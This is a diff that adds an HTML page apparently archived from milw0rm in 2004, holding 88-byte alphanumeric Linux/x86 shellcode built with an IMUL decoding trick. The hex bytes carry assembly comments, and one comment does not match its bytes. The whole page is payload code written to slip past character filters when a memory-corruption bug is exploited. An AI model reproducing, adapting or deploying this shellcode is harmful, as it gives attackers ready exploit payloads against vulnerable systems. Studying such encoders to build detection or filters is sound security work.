@@ -1,0 +1,46 @@
+<html>
+<head>
+<title>linux/x86 alpha-numeric using IMUL Method shellcode 88 bytes</title>
+<pre>
+     /*-----------------------------------------------------*/
+     /*     Alpha-Numeric Shellcode using IMUL Method       */
+     /*           By XORt@dallas_2600)              88bytes */
+     /*-----------------------------------------------------*/
+     &quot;\x68\x69\x58\x69\x6b&quot; /* push $0x6b695869             */
+     &quot;\x68\x7a\x36\x37\x70&quot; /* push $0x7037367a             */
+     &quot;\x68\x58\x58\x41\x73&quot; /* push $0x73415858             */
+     &quot;\x68\x71\x4a\x77\x79&quot; /* push $0x79774a71             */
+     &quot;\x68\x65\x77\x57\x31&quot; /* push $0x31577765             */
+     &quot;\x68\x42\x69\x57\x77&quot; /* push $0x6850c031             */
+     &quot;\x50\x50\x50\x50\x50&quot; /* 17 push %eax's               */
+     &quot;\x50\x50\x50\x50\x50&quot; /*                              */
+     &quot;\x50\x50\x50\x50\x50&quot; /*                              */
+     &quot;\x50\x50&quot;             /*                              */
+     &quot;\x54&quot;                 /* push %esp                    */
+     &quot;\x59&quot;                 /* pop %ecx                     */
+     &quot;\x6b\x51\x58\x57&quot;     /* imul $0x57, 0x58(%ecx), %edx */
+     &quot;\x42&quot;                 /* inc %edx                     */
+     &quot;\x52&quot;                 /* push %edx                    */
+     &quot;\x6b\x41\x54\x78&quot;     /* imul $0x78, 0x54(%ecx), %edx */
+     &quot;\x34\x63&quot;             /* xor $0x63, %al               */
+     &quot;\x50&quot;                 /* push %eax                    */
+     &quot;\x6b\x51\x50\x4a&quot;     /* imul $0x4a, 0x50(%ecx), %edx */
+     &quot;\x4a&quot;                 /* dec %edx                     */
+     &quot;\x4a&quot;                 /* dec %edx                     */
+     &quot;\x52&quot;                 /* push %edx                    */
+     &quot;\x6b\x51\x4c\x79&quot;     /* imul $0x79, 0x4c(%ecx), %edx */
+     &quot;\x4a&quot;                 /* dec %edx                     */
+     &quot;\x52&quot;                 /* push %edx                    */
+     &quot;\x6b\x41\x48\x36&quot;     /* imul $0x36, 0x48(%ecx), %edx */
+     &quot;\x34\x61&quot;             /* xor $0x61, %al               */
+     &quot;\x50&quot;                 /* push %eax                    */
+     &quot;\x6b\x51\x44\x79&quot;     /* imul $0x79, 0x44(%ecx), %edx */
+     &quot;\x4a&quot;                 /* dec %edx                     */
+     &quot;\x52&quot;                 /* push %edx                    */
+     /*------------------------------------------[bytes:88]-*/
+
+
+// milw0rm.com [2004-12-22]
+</pre>
+</html>
+
